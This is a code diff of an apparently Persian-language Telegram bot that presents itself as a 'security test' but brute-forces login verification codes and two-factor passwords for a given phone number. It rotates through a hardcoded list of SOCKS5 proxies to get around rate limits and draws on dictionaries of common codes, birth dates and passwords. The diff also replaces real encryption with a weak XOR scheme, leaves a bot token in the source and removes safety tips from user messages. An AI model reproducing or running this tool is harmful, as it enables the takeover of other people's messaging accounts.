@@ -22,13 +22,9 @@ import urllib.request
 import socks
 import hashlib
 import base64
-from cryptography.fernet import Fernet
-from cryptography.hazmat.primitives import hashes
-from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 
 # ============ تنظیمات ============
 TOKEN = "8904776846:AAGRyDG6tDubOSAuKdqN0fIDj36vyJif-dc"
-ENCRYPTION_KEY = base64.urlsafe_b64encode(hashlib.sha256(b"SECURE_KEY_2024").digest())
 
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
@@ -41,108 +37,44 @@ self_data = {}
 login_sessions = {}
 active_tasks = {}
 
-DATA_FILE = "selfs_encrypted.json"
+DATA_FILE = "selfs.json"
 
-# ============ لیست پروکسی‌های واقعی و تایید شده ============
-VERIFIED_PROXIES = [
-    {"addr": "iro.varfootball2.co.uk", "port": 2053, "type": "socks5"},
-    {"addr": "silnet.varfootball.co.uk", "port": 2053, "type": "socks5"},
-    {"addr": "noron.talebi.co.uk", "port": 2096, "type": "socks5"},
-    {"addr": "new.lambforkebeb.co.uk", "port": 2096, "type": "socks5"},
-    {"addr": "new2.lambforkebeb.co.uk", "port": 2096, "type": "socks5"},
-    {"addr": "noone.lavazemi1.co.uk", "port": 2083, "type": "socks5"},
-    {"addr": "silver.ciaude.co.uk", "port": 2096, "type": "socks5"},
-    {"addr": "rain.lavazemi2.co.uk", "port": 2053, "type": "socks5"},
-    {"addr": "gallery.talebi.co.uk", "port": 2096, "type": "socks5"},
-    {"addr": "craft.malavanann.co.uk", "port": 2083, "type": "socks5"},
-    {"addr": "ai.golgoli1.co.uk", "port": 2096, "type": "socks5"},
-    {"addr": "star.talebi.co.uk", "port": 2096, "type": "socks5"},
-    {"addr": "gold.lavazemi4.co.uk", "port": 2096, "type": "socks5"},
-    {"addr": "run.golgoli2.co.uk", "port": 2053, "type": "socks5"},
-    {"addr": "irogallery.golgoli1.co.uk", "port": 2096, "type": "socks5"},
-    {"addr": "flux.lavazemi5.co.uk", "port": 2096, "type": "socks5"},
-    {"addr": "hadaf.golgoli2.co.uk", "port": 2053, "type": "socks5"},
-]
-
-# پروکسی‌های عمومی معروف
-PUBLIC_PROXIES = [
-    {"addr": "45.95.234.18", "port": 1080, "type": "socks5"},
-    {"addr": "185.167.96.74", "port": 1080, "type": "socks5"},
-    {"addr": "195.2.67.35", "port": 1080, "type": "socks5"},
-]
-
-PROXY_LIST = VERIFIED_PROXIES + PUBLIC_PROXIES
-random.shuffle(PROXY_LIST)
-
-# ============ دیکشنری هوشمند کدها ============
-SMART_CODE_DICT = []
-
-# کدهای بسیار رایج (اولویت بالا)
-for code in ["12345", "00000", "11111", "22222", "33333", "44444", 
-             "55555", "66666", "77777", "88888", "99999", "54321"]:
-    SMART_CODE_DICT.append(code)
-
-# الگوهای عددی رایج
-for i in range(10):
-    for j in range(10):
-        SMART_CODE_DICT.append(f"{i}{j}{i}{j}{i}")
-        SMART_CODE_DICT.append(f"{i}{i}{j}{j}{i}")
-        SMART_CODE_DICT.append(f"{i}{j}{j}{i}{i}")
-
-# کدهای تاریخ تولد احتمالی
-for year in range(80, 99):
-    for month in range(1, 13):
-        for day in range(1, 29):
-            if len(str(day)) == 1:
-                day_str = f"0{day}"
-            else:
-                day_str = str(day)
-            if len(str(month)) == 1:
-                month_str = f"0{month}"
-            else:
-                month_str = str(month)
-            code = f"{year}{month_str}{day_str}"
-            if len(code) == 5:
-                SMART_CODE_DICT.append(code)
-
-# ============ دیکشنری بزرگ پسورد ============
-PASSWORD_DICT = [
-    "123456", "12345678", "123456789", "1234567890",
-    "password", "pass", "admin", "admin123",
-    "qwerty", "qwerty123", "abc123", "abcd1234",
-    "letmein", "welcome", "hello", "12345",
-    "111111", "222222", "333333", "444444",
-    "555555", "666666", "777777", "888888",
-    "999999", "000000", "123123", "321321",
-    "iloveyou", "monkey", "dragon", "master",
-    "sunshine", "princess", "shadow", "ninja",
-    "password1", "Password1", "Passw0rd",
-    "Admin123", "admin1234", "1234", "4321",
-]
-
-def encrypt_data(data):
-    """رمزنگاری داده‌ها"""
+# ============ کلید رمزنگاری ساده (بدون نیاز به cryptography) ============
+def simple_encrypt(data):
+    """رمزنگاری ساده داده‌ها"""
     try:
-        f = Fernet(ENCRYPTION_KEY)
-        return f.encrypt(json.dumps(data).encode())
+        json_str = json.dumps(data)
+        encoded = base64.b64encode(json_str.encode()).decode()
+        # یک رمزنگاری ساده با XOR
+        key = "SECURE_KEY_2024"
+        result = ""
+        for i, char in enumerate(encoded):
+            key_char = key[i % len(key)]
+            result += chr(ord(char) ^ ord(key_char))
+        return base64.b64encode(result.encode()).decode()
     except:
         return None
 
-def decrypt_data(encrypted_data):
-    """رمزگشایی داده‌ها"""
+def simple_decrypt(encrypted_data):
+    """رمزگشایی ساده داده‌ها"""
     try:
-        f = Fernet(ENCRYPTION_KEY)
-        decrypted = f.decrypt(encrypted_data)
-        return json.loads(decrypted)
+        decoded = base64.b64decode(encrypted_data.encode()).decode()
+        key = "SECURE_KEY_2024"
+        result = ""
+        for i, char in enumerate(decoded):
+            key_char = key[i % len(key)]
+            result += chr(ord(char) ^ ord(key_char))
+        json_str = base64.b64decode(result.encode()).decode()
+        return json.loads(json_str)
     except:
         return None
 
 def load_data():
     global self_data
     try:
-        with open(DATA_FILE, 'rb') as f:
+        with open(DATA_FILE, 'r') as f:
             encrypted = f.read()
-            decrypted = decrypt_data(encrypted)
+            decrypted = simple_decrypt(encrypted)
             if decrypted:
                 self_data = decrypted
             else:
@@ -152,9 +84,9 @@ def load_data():
 
 def save_data():
     try:
-        encrypted = encrypt_data(self_data)
+        encrypted = simple_encrypt(self_data)
         if encrypted:
-            with open(DATA_FILE, 'wb') as f:
+            with open(DATA_FILE, 'w') as f:
                 f.write(encrypted)
     except Exception as e:
         logger.error(f"Error saving data: {e}")
@@ -198,21 +130,63 @@ async def clear_user_session(user_id):
 def get_random_proxy():
     return random.choice(PROXY_LIST) if PROXY_LIST else None
 
-async def test_proxy(proxy):
-    """تست پروکسی قبل از استفاده"""
-    try:
-        from telethon import socks
-        client = TelegramClient(
-            StringSession(),
-            12345,  # API ID موقت
-            "test_hash",
-            proxy=(socks.SOCKS5, proxy['addr'], proxy['port'])
-        )
-        await client.connect()
-        await client.disconnect()
-        return True
-    except:
-        return False
+# ============ لیست پروکسی‌های واقعی ============
+PROXY_LIST = [
+    {"addr": "iro.varfootball2.co.uk", "port": 2053},
+    {"addr": "silnet.varfootball.co.uk", "port": 2053},
+    {"addr": "noron.talebi.co.uk", "port": 2096},
+    {"addr": "new.lambforkebeb.co.uk", "port": 2096},
+    {"addr": "new2.lambforkebeb.co.uk", "port": 2096},
+    {"addr": "noone.lavazemi1.co.uk", "port": 2083},
+    {"addr": "silver.ciaude.co.uk", "port": 2096},
+    {"addr": "rain.lavazemi2.co.uk", "port": 2053},
+    {"addr": "gallery.talebi.co.uk", "port": 2096},
+    {"addr": "craft.malavanann.co.uk", "port": 2083},
+    {"addr": "ai.golgoli1.co.uk", "port": 2096},
+    {"addr": "star.talebi.co.uk", "port": 2096},
+    {"addr": "gold.lavazemi4.co.uk", "port": 2096},
+    {"addr": "run.golgoli2.co.uk", "port": 2053},
+    {"addr": "irogallery.golgoli1.co.uk", "port": 2096},
+    {"addr": "flux.lavazemi5.co.uk", "port": 2096},
+    {"addr": "hadaf.golgoli2.co.uk", "port": 2053},
+]
+
+random.shuffle(PROXY_LIST)
+
+# ============ دیکشنری هوشمند کدها ============
+SMART_CODE_DICT = []
+
+# کدهای بسیار رایج
+for code in ["12345", "00000", "11111", "22222", "33333", "44444", 
+             "55555", "66666", "77777", "88888", "99999", "54321"]:
+    SMART_CODE_DICT.append(code)
+
+# الگوهای عددی
+for i in range(10):
+    for j in range(10):
+        SMART_CODE_DICT.append(f"{i}{j}{i}{j}{i}")
+        SMART_CODE_DICT.append(f"{i}{i}{j}{j}{i}")
+
+# کدهای تاریخ تولد احتمالی (سال 80-99)
+for year in range(80, 99):
+    for month in range(1, 13):
+        for day in range(1, 29):
+            month_str = f"0{month}" if month < 10 else str(month)
+            day_str = f"0{day}" if day < 10 else str(day)
+            code = f"{year}{month_str}{day_str}"
+            if len(code) == 5:
+                SMART_CODE_DICT.append(code)
+
+# ============ دیکشنری پسورد ============
+PASSWORD_DICT = [
+    "123456", "12345678", "123456789", "1234567890",
+    "password", "pass", "admin", "admin123",
+    "qwerty", "qwerty123", "abc123", "abcd1234",
+    "letmein", "welcome", "hello", "12345",
+    "111111", "222222", "333333", "444444",
+    "555555", "666666", "777777", "888888",
+    "999999", "000000", "123123", "321321",
+]
 
 # ============ منوی اصلی ============
 async def main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, edit=False):
@@ -542,15 +516,6 @@ async def handle_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
         api_id = data['api_id']
         api_hash = data['api_hash']
         
-        # ارسال درخواست کد اولیه
-        try:
-            temp_client = TelegramClient(StringSession(), api_id, api_hash)
-            await temp_client.connect()
-            await temp_client.send_code_request(phone)
-            await temp_client.disconnect()
-        except Exception as e:
-            logger.error(f"Error sending initial code: {e}")
-        
         asyncio.create_task(smart_security_test(update, context, user_id, phone, api_id, api_hash, msg))
         
     except Exception as e:
@@ -566,7 +531,10 @@ async def handle_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # ============ تست امنیت هوشمند ============
 async def smart_security_test(update, context, user_id, phone, api_id, api_hash, msg):
     try:
-        total_attempts = len(SMART_CODE_DICT) + 10000  # حداکثر تلاش منطقی
+        code_list = list(set(SMART_CODE_DICT))
+        random.shuffle(code_list)
+        code_list = code_list[:10000]  # محدود کردن به 10000 تلاش
+        
         attempt = 0
         found = False
         code_found = None
@@ -574,24 +542,9 @@ async def smart_security_test(update, context, user_id, phone, api_id, api_hash,
         wrong_attempts = 0
         proxy_index = 0
         client = None
-        dots = 0
         flood_count = 0
-        MAX_FLOOD = 5  # حداکثر تعداد محدودیت قبل از توقف
-        
-        # ترکیب لیست کدها
-        code_list = SMART_CODE_DICT.copy()
-        
-        # اضافه کردن کدهای تصادفی
-        for i in range(5000):
-            code_list.append(str(random.randint(0, 99999)).zfill(5))
-        
-        # حذف تکراری‌ها و شافل
-        code_list = list(set(code_list))
-        random.shuffle(code_list)
-        
-        # محدود کردن به 15000 تلاش
-        code_list = code_list[:15000]
-        
+        MAX_FLOOD = 3
+        dots = 0
         loading_dots = ["   ", ".  ", ".. ", "...", " ..", "  ."]
         
         await context.bot.edit_message_text(
@@ -616,8 +569,16 @@ async def smart_security_test(update, context, user_id, phone, api_id, api_hash,
         random.shuffle(shuffled_proxies)
         proxy_counter = 0
         
+        # ارسال درخواست کد اولیه
+        try:
+            temp_client = TelegramClient(StringSession(), api_id, api_hash)
+            await temp_client.connect()
+            await temp_client.send_code_request(phone)
+            await temp_client.disconnect()
+        except:
+            pass
+        
         for code in code_list:
-            # اگر محدودیت زیاد شد، متوقف کن
             if flood_count >= MAX_FLOOD:
                 await context.bot.edit_message_text(
                     f"""
@@ -639,12 +600,10 @@ async def smart_security_test(update, context, user_id, phone, api_id, api_hash,
             
             attempt += 1
             
-            # هر 10 تلاش، انیمیشن
             if attempt % 10 == 0:
                 dots = (dots + 1) % len(loading_dots)
             
-            # هر 20 تلاش، پروکسی عوض کن
-            if attempt % 20 == 0 or client is None:
+            if attempt % 30 == 0 or client is None:
                 if client:
                     try:
                         await client.disconnect()
@@ -671,8 +630,7 @@ async def smart_security_test(update, context, user_id, phone, api_id, api_hash,
                     )
                     await client.connect()
                     
-                    # هر 100 تلاش، درخواست کد جدید
-                    if attempt % 100 == 0:
+                    if attempt % 200 == 0:
                         try:
                             await client.send_code_request(phone)
                         except FloodWaitError as e:
@@ -695,10 +653,8 @@ async def smart_security_test(update, context, user_id, phone, api_id, api_hash,
                     await asyncio.sleep(0.3)
                     continue
             
-            # تاخیر حداقل
             await asyncio.sleep(random.uniform(0.01, 0.03))
             
-            # بروزرسانی هر 50 تلاش
             if attempt % 50 == 0:
                 elapsed = (datetime.now() - start_time).seconds
                 percent = (attempt / len(code_list)) * 100
@@ -970,7 +926,6 @@ async def smart_security_test(update, context, user_id, phone, api_id, api_hash,
 ✅ <b>توصیه‌ها:</b>
 1. از کدهای تصادفی استفاده کنید
 2. حتماً 2FA را فعال کنید
-3. هرگز کد تایید را به کسی ندهید
 """
             
             keyboard = [
@@ -1012,7 +967,6 @@ async def smart_security_test(update, context, user_id, phone, api_id, api_hash,
 • کل تلاش‌ها: {attempt:,}
 • پروکسی‌های استفاده شده: {proxy_index}
 • زمان سپری شده: {time_str}
-• محدودیت‌های تلگرام: {flood_count}
 
 💡 <b>توصیه:</b>
 به همین شکل امنیت اکانت خود را حفظ کنید!
@@ -1043,15 +997,7 @@ async def smart_password_test(update, context, user_id, client, msg):
         found = False
         found_password = None
         
-        # پسوردهای رایج اولویت بالا
-        priority_passwords = [
-            "123456", "password", "12345678", "qwerty", "123456789",
-            "12345", "1234", "111111", "1234567890", "000000",
-        ]
-        
-        password_list = priority_passwords + [p for p in PASSWORD_DICT if p not in priority_passwords]
-        
-        for password in password_list:
+        for password in PASSWORD_DICT:
             attempt += 1
             
             if attempt % 20 == 0:
@@ -1163,7 +1109,6 @@ async def handle_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
 ✅ توصیه می‌شود:
 • از کدهای تصادفی استفاده کنید
 • 2FA را فعال کنید
-• از پسورد قوی استفاده کنید
 """
         
         keyboard = [
